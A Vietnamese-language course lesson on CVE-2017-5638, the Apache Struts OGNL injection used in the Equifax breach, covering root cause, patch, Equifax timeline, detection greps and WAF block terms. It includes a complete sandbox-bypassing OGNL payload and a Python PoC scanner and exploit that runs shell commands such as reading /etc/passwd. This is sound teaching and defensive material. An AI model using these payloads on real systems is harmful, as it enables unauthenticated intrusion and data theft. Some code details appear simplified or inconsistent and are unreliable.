---
title: "11. Apache Struts — OGNL Expression Injection"
tags: [security, cve, landmark-cves, struts, ognl, rce, equifax, java, lesson-11]
aliases: [Apache Struts OGNL, CVE-2017-5638, S2-045]
created: 2026-03-24
---

> **Prerequisites**: [[09-log4shell-root-cause|09. Log4Shell Part 1]] (Java execution context), HTTP multipart basics, Java exception handling
> **Objectives**:
> - Hiểu Apache Struts 2 MVC architecture và vai trò của Jakarta Multipart Parser
> - Phân tích source code `JakartaMultiPartRequest.java` — điểm lỗi chính xác
> - Hiểu OGNL (Object Graph Navigation Language) — tại sao nó có thể execute Java code
> - Trace call chain: `Content-Type header` → exception → `LocalizedTextUtil.findText()` → OGNL eval → RCE
> - Viết PoC Python tấn công qua Content-Type header
> - Hiểu liên hệ với vụ Equifax 2017 — 147 triệu người bị lộ dữ liệu
> - So sánh với Log4Shell về lớp lỗi (expression injection qua logging/error path)

---

## Bối cảnh: Lỗi $17.7 Tỷ Đô

CVE-2017-5638 (còn gọi là S2-045 theo đánh số của Struts) được công bố ngày 6/3/2017 bởi researcher Nike Zheng người Trung Quốc. Trong vòng vài giờ, exploit PoC đã xuất hiện công khai. Hai tháng sau, Equifax — một trong những công ty tín dụng lớn nhất thế giới — bị breach qua chính lỗ hổng này.

**Hậu quả của vụ Equifax:**
- 147 triệu người Mỹ bị lộ số Social Security, ngày sinh, địa chỉ
- ~$17.7 tỷ đô chi phí (settlement, legal fees, remediation)
- CEO, CIO, CSO của Equifax từ chức
- Patch đã có từ tháng 3/2017, Equifax bị breach vào tháng 5/2017 — **2 tháng sau khi patch ra**

Đây là case study cổ điển nhất về patch management failure. Lỗi không phức tạp — chỉ cần một HTTP request với Content-Type đặc biệt. Nhưng một organization với $3B doanh thu hàng năm đã không patch trong 2 tháng.

---

## Apache Struts 2 Architecture

### MVC Framework Overview

Apache Struts 2 là Java web framework theo kiến trúc Model-View-Controller:

```text
HTTP Request
     │
     ▼
┌─────────────────────────────────────────────────────┐
│  FilterDispatcher / StrutsPrepareAndExecuteFilter    │
│  (Front Controller — intercept mọi request)          │
└──────────────────────┬──────────────────────────────┘
                       │
          ┌────────────▼────────────────┐
          │  ActionMapper               │
          │  (map URL → Action class)   │
          └────────────┬────────────────┘
                       │
          ┌────────────▼────────────────┐
          │  Interceptor Stack          │  ← FileUploadInterceptor ở đây
          │  (pre/post processing)      │
          └────────────┬────────────────┘
                       │
          ┌────────────▼────────────────┐
          │  Action class               │
          │  (business logic)           │
          └────────────┬────────────────┘
                       │
          ┌────────────▼────────────────┐
          │  Result / View (JSP/FTL)    │
          └─────────────────────────────┘
```

### Jakarta Multipart Parser

Khi request có `Content-Type: multipart/form-data`, Struts dùng `JakartaMultiPartRequest` để parse file upload:

```java
// Struts 2 — FileUploadInterceptor.java
public class FileUploadInterceptor extends AbstractInterceptor {
    @Override
    public String intercept(ActionInvocation invocation) throws Exception {
        ActionContext ac = invocation.getInvocationContext();
        HttpServletRequest request = (HttpServletRequest) ac.get(HTTP_REQUEST_KEY);

        if (!(request instanceof MultiPartRequestWrapper)) {
            return invocation.invoke();
        }

        MultiPartRequestWrapper multiWrapper = (MultiPartRequestWrapper) request;

        if (multiWrapper.hasErrors()) {
            // Có lỗi parse → xây dựng error message
            for (String error : multiWrapper.getErrors()) {
                // Lấy error message từ LocalizedTextUtil
                // ← BUG NẰM Ở ĐÂY
                String msg = buildErrorMessage(e, new Object[]{error});
            }
        }
        return invocation.invoke();
    }

    private String buildErrorMessage(Throwable e, Object[] args) {
        String errorKey = "struts.messages.error.uploading";
        // LocalizedTextUtil.findText sẽ evaluate OGNL trong args!
        return LocalizedTextUtil.findText(
            this.getClass(), errorKey, locale, e.getMessage(), args
        );
    }
}
```

---

## OGNL — Object Graph Navigation Language

### OGNL là gì?

OGNL là expression language của Struts 2 — tương tự EL (Expression Language) trong JSP, nhưng mạnh hơn nhiều. Nó cho phép:

```text
# Đọc property:
user.name           → user.getName()
user.address.city   → user.getAddress().getCity()

# Gọi method:
@java.lang.Math@random()     → Math.random()
@java.lang.Runtime@getRuntime().exec('id')  → SHELL EXECUTION

# Tạo object:
new java.util.ArrayList()

# Truy cập OgnlContext:
#context['attr']
#parameters['key']
#session['user']
```

> [!definition] Definition 11.1 — OGNL Security Context
> Struts 2 wrap OGNL trong một `OgnlContext` chứa nhiều object đặc quyền: `#application`, `#session`, `#parameters`, `#request`, `#response`. Các OGNL expression có thể access Java runtime qua `@class@method` syntax. Nếu OGNL evaluates user-controlled input → arbitrary Java code execution.

### Các field nguy hiểm trong OGNL context

Trước khi exploit, Struts có các biện pháp bảo vệ OGNL:
- `_memberAccess` kiểm soát quyền truy cập member
- Excluded classes/packages list ngăn access `java.lang.Runtime`, v.v.

Exploit phải bypass những protection này. Payload điển hình:

```java
// Bypass protection, sau đó execute command
%{
  (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
  (#_memberAccess?(#_memberAccess=#dm):
    ((#container=#context['com.opensymphony.xwork2.ActionContext.container']).
    (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
    (#ognlUtil.getExcludedPackageNames().clear()).
    (#ognlUtil.getExcludedClasses().clear()).
    (#context.setMemberAccess(#dm)))).
  (#cmd='COMMAND_HERE').
  (#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
  (#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/sh','-c',#cmd})).
  (#p=new java.lang.ProcessBuilder(#cmds)).
  (#p.redirectErrorStream(true)).
  (#process=#p.start()).
  (#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).
  (@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).
  (#ros.flush())
}
```

---

## Root Cause — Lỗi Xảy Ra Ở Đâu?

### Call chain đầy đủ

```text
1. HTTP Request đến Struts server:
   POST /struts2-showcase/upload.action HTTP/1.1
   Content-Type: %{(#_='multipart/form-data')...OGNL_PAYLOAD...}
                  ↑ Content-Type chứa OGNL expression

2. Struts FilterDispatcher nhận request
   → Detect multipart (dựa vào Content-Type prefix "multipart/")
   → Khởi tạo JakartaMultiPartRequest

3. JakartaMultiPartRequest.parse() gọi Jakarta Commons FileUpload
   → Jakarta FileUpload parse Content-Type header
   → Content-Type không hợp lệ → throw InvalidContentTypeException
   → Exception message = nguyên văn Content-Type string (chứa OGNL)

4. FileUploadInterceptor nhận exception
   → Gọi LocalizedTextUtil.findText(this.getClass(), key, locale,
                                     e.getMessage(), args)
     ↑ args[0] = e.getMessage() = Content-Type string chứa OGNL

5. LocalizedTextUtil.findText() → TextParseUtil.translateVariables()
   → Tìm %{...} pattern trong args
   → Evaluate OGNL expression bên trong → RCE!
```

### Source code điểm lỗi chính xác

```java
// JakartaMultiPartRequest.java — Struts 2.3.x vulnerable
public class JakartaMultiPartRequest implements MultiPartRequest {

    public void parse(HttpServletRequest request, String saveDir) {
        try {
            // Dùng Apache Commons FileUpload để parse
            ServletFileUpload upload = createFileUpload(request);
            List<FileItem> items = upload.parseRequest(request);
            // ...
        } catch (FileUploadException e) {
            // BUG: Exception message = raw Content-Type string từ user
            // Được lưu vào errors list để display sau
            errors.add(e.getMessage());
            //        ↑ ĐÂY: e.getMessage() = "Content-Type: %{OGNL_PAYLOAD}"
        }
    }
}

// FileUploadInterceptor.java — xử lý errors
if (multiWrapper.hasErrors()) {
    for (String error : multiWrapper.getErrors()) {
        String msg = LocalizedTextUtil.findText(
            this.getClass(),
            "struts.messages.error.content.type.not.allowed",
            ActionContext.getContext().getLocale(),
            "no.text",
            new Object[]{error}  // ← error = OGNL payload từ Content-Type
        );
        // LocalizedTextUtil.findText gọi TextParseUtil.translateVariables
        // translateVariables evaluate %{...} trong Object[] args → RCE
    }
}
```

> [!definition] Definition 11.2 — Root Cause
> `LocalizedTextUtil.findText()` dùng `TextParseUtil.translateVariables()` để build error message, và hàm này evaluate `%{...}` pattern trong arguments. Khi Content-Type header chứa OGNL expression trong `%{...}`, nó được evaluate trong Struts OgnlContext với đầy đủ quyền Java — dẫn đến RCE không cần authentication, không cần user interaction.
>
> **Lỗi cốt lõi**: user-controlled data (HTTP header) đi vào error message construction mà không sanitize, và error message construction có khả năng evaluate expression language.

### Patch Analysis

Apache Struts fix bằng cách xóa `LocalizedTextUtil` khỏi FileUploadInterceptor:

```java
// FileUploadInterceptor.java — sau patch
if (multiWrapper.hasErrors()) {
    for (String error : multiWrapper.getErrors()) {
        // PATCH: Dùng String.format thay vì LocalizedTextUtil
        // → không có OGNL evaluation
        String msg = String.format(
            "Error processing file upload: %s",
            escapeHtml(error)   // ← thêm escaping
        );
        addActionError(msg);
    }
}
```

Thay đổi chính:
- Xóa `LocalizedTextUtil.findText()` khỏi error handling trong FileUploadInterceptor
- Thêm validation Content-Type header trước khi parse
- Restrict OGNL access trong `SecurityMemberAccess`

---

## PoC Python — HTTP Request Exploit

```python
import requests
import sys

TARGET = "http://localhost:8080"
ENDPOINT = "/struts2-showcase/showcase.action"

def build_ognl_payload(command):
    """
    Build OGNL payload bypass security restrictions và execute command.
    Payload này hoạt động với Struts 2.3.5 - 2.3.31, 2.5.0 - 2.5.10.
    """
    # Bypass _memberAccess restrictions, sau đó execute command
    payload = (
        "%{"
        "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        "(#_memberAccess?(#_memberAccess=#dm):"
        "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        "(#ognlUtil.getExcludedPackageNames().clear())."
        "(#ognlUtil.getExcludedClasses().clear())."
        "(#context.setMemberAccess(#dm))))."
        f"(#cmd='{command}')."
        "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
        "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/sh','-c',#cmd}))."
        "(#p=new java.lang.ProcessBuilder(#cmds))."
        "(#p.redirectErrorStream(true))."
        "(#process=#p.start())."
        "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
        "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
        "(#ros.flush())"
        "}"
    )
    return payload

def exploit(target, endpoint, command):
    """
    Gửi exploit request với OGNL payload trong Content-Type header.
    """
    url = target.rstrip('/') + endpoint
    payload = build_ognl_payload(command)

    headers = {
        "Content-Type": payload,
        "User-Agent": "Mozilla/5.0",
    }

    print(f"[*] Target: {url}")
    print(f"[*] Command: {command}")
    print(f"[*] Payload length: {len(payload)} bytes")
    print(f"[*] Sending exploit request...")

    try:
        resp = requests.post(
            url,
            headers=headers,
            data=b"test",
            timeout=10,
            verify=False
        )
        print(f"[*] Response: {resp.status_code} ({len(resp.content)} bytes)")
        if resp.text.strip():
            print(f"\n[+] Command output:")
            print(resp.text.strip())
        else:
            print("[-] Empty response — server may not be vulnerable or command had no output")
        return resp
    except requests.exceptions.RequestException as e:
        print(f"[-] Request error: {e}")
        return None

def scan(target, endpoints=None):
    """
    Scan target để tìm vulnerable endpoint.
    """
    if endpoints is None:
        endpoints = [
            "/struts2-showcase/showcase.action",
            "/struts2-rest-showcase/orders",
            "/struts2-showcase/upload.action",
            "/index.action",
            "/login.action",
            "/",
        ]

    test_payload = (
        "%{#_memberAccess['allowStaticMethodAccess']=true,"
        "#res=@org.apache.struts2.ServletActionContext@getResponse(),"
        "#res.setCharacterEncoding('UTF-8'),"
        "#w=#res.getWriter(),"
        "#w.print('STRUTS2_VULN_CHECK'),"
        "#w.flush(),"
        "#w.close()}"
    )

    for ep in endpoints:
        url = target.rstrip('/') + ep
        try:
            resp = requests.post(
                url,
                headers={"Content-Type": test_payload},
                data=b"",
                timeout=5,
                verify=False
            )
            if 'STRUTS2_VULN_CHECK' in resp.text:
                print(f"[+] VULNERABLE: {ep}")
                return ep
            else:
                print(f"[-] {ep}: {resp.status_code} (not vulnerable or no output)")
        except Exception as e:
            print(f"[-] {ep}: {e}")
    return None

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()

    print("=== Apache Struts CVE-2017-5638 PoC ===")
    print()

    ep = scan(TARGET)
    if ep:
        print(f"\n[*] Exploiting {ep}...")
        exploit(TARGET, ep, "id")
        exploit(TARGET, ep, "hostname")
        exploit(TARGET, ep, "cat /etc/passwd")
```

### Dựng target với Docker

```bash
docker pull piesecurity/apache-struts2-cve-2017-5638
docker run -d -p 8080:8080 --name struts cve-2017-5638
docker ps

python3 struts_poc.py
```

---

## Equifax Breach — Timeline và Bài Học

```text
06/03/2017  CVE-2017-5638 được công bố, patch sẵn sàng
07/03/2017  Exploit PoC xuất hiện công khai trên GitHub
13/03/2017  Equifax được US-CERT cảnh báo về lỗ hổng
Tháng 3     Equifax chạy scan nội bộ — SAI VÀ BỎ SÓT servers bị ảnh hưởng
12/05/2017  Attacker bắt đầu tấn công Equifax qua CVE-2017-5638
29/07/2017  Equifax phát hiện traffic bất thường (76 ngày sau khi breach bắt đầu!)
07/09/2017  Equifax công bố breach công khai
```

**Tại sao Equifax bị breach dù có patch?**

1. **Certificate inspection failure**: SSL traffic inspection certificate đã hết hạn 19 tháng, nên encrypted traffic của attacker không được inspect → không phát hiện attack traffic
2. **Asset inventory gaps**: scan tìm Struts vulnerable không cover tất cả servers — ít nhất một internet-facing server bị bỏ sót
3. **Patch process failure**: process vá lỗi yêu cầu 48-giờ, nhưng implementation chậm và không verify
4. **Segmentation không đủ**: sau khi vào được một server, attacker lateral move đến 48 servers khác, exfil 265 triệu records qua 76 ngày mà không bị phát hiện

---

## Wireshark Detection

### Pattern nhận dạng

```text
Filter:
  http.request.method == "POST" && http contains "%{"

Dấu hiệu:
- Content-Type header chứa %{ hoặc #dm hoặc OgnlContext
- POST request đến .action endpoint với unusual Content-Type
- Response chứa output của system command (uname, id, hostname)
```

### Log-based detection

```bash
# Apache/Nginx access log
grep -E 'Content-Type.*%\{' /var/log/apache2/access.log

# Struts error log
grep -E 'OGNL|OgnlException|LocalizedTextUtil' /var/log/tomcat/catalina.out

# Detect OgnlContext bypass pattern
grep 'DEFAULT_MEMBER_ACCESS\|excludedPackageNames\|excludedClasses' /var/log/
```

---

## So sánh với Log4Shell

| Đặc điểm | CVE-2017-5638 (Struts) | CVE-2021-44228 (Log4Shell) |
|----------|----------------------|--------------------------|
| Injection point | HTTP Content-Type header | Bất kỳ logged string nào |
| Expression lang | OGNL | JNDI lookup (sau đó OGNL/EL) |
| Trigger | Multipart parse error | Logging call |
| Auth cần? | Không | Không |
| Output channel | HTTP response | DNS/LDAP callback |
| Framework | Apache Struts 2 | Java Log4j 2 |
| Lớp lỗi | Expression injection qua error message | Expression injection qua logging |
| Equilvalent pattern | `LocalizedTextUtil.findText(untrustedInput)` | `logger.info(untrustedInput)` |

**Pattern chung**: cả hai đều là **expression evaluation trên untrusted input** — một qua error message, một qua log message. Đây là lý do tại sao mọi framework có expression evaluation cần được audit cẩn thận về các data flow từ user input.

---

## Mitigation

```text
1. PATCH NGAY:
   Struts 2.3.32+ hoặc 2.5.10.1+

2. Validate Content-Type trước khi parse:
   Chỉ accept "multipart/form-data" và "application/x-www-form-urlencoded"
   Reject bất kỳ Content-Type nào chứa ký tự đặc biệt

3. Dùng alternative multipart parser:
   Jason Pell's multipart parser không dùng Jakarta
   Thêm vào WEB-INF/lib và config:
   <constant name="struts.multipart.parser" value="cos" />

4. WAF rule:
   Block requests với Content-Type chứa: %{, #, @ognl, ProcessBuilder

5. Principle of Least Privilege:
   Chạy Struts app với user có quyền tối thiểu (không phải root)
   → Dù RCE thành công, damage bị giới hạn
```

---

## Summary

- Apache Struts 2 dùng Jakarta Multipart Parser khi nhận `multipart/form-data` request
- Invalid Content-Type → `FileUploadException` → error message chứa raw Content-Type được pass vào `LocalizedTextUtil.findText()`
- `findText()` gọi `TextParseUtil.translateVariables()` → evaluate `%{...}` pattern → OGNL execution
- OGNL trong Struts context có thể access Java runtime (`ProcessBuilder`, `Runtime.exec()`) → OS command execution
- Exploit: một HTTP POST request với OGNL payload trong Content-Type header → RCE không cần auth
- Equifax: patch đã ra 2 tháng trước, nhưng process failure + asset inventory gaps → 147 triệu records bị lộ
- **Lớp lỗi**: Expression Language Injection (EL Injection) qua error message — pattern tương tự Log4Shell

---

## References

- Apache Security Advisory S2-045: https://cwiki.apache.org/confluence/display/WW/S2-045
- Equifax post-mortem (US Senate report): https://www.warren.senate.gov/imo/media/doc/2018.09.06%20GAO%20Equifax%20report.pdf
- Trend Micro technical analysis: https://www.trendmicro.com/en_us/research/17/c/cve-2017-5638-apache-struts-vulnerability-remote-code-execution.html
- Pentest-Tools OGNL deep dive: https://pentest-tools.com/blog/exploiting-ognl-injection-in-apache-struts
- GitHub Security Lab CodeQL analysis: https://securitylab.github.com/research/ognl-injection-apache-struts/
- exploit-db #41570: https://www.exploit-db.com/exploits/41570
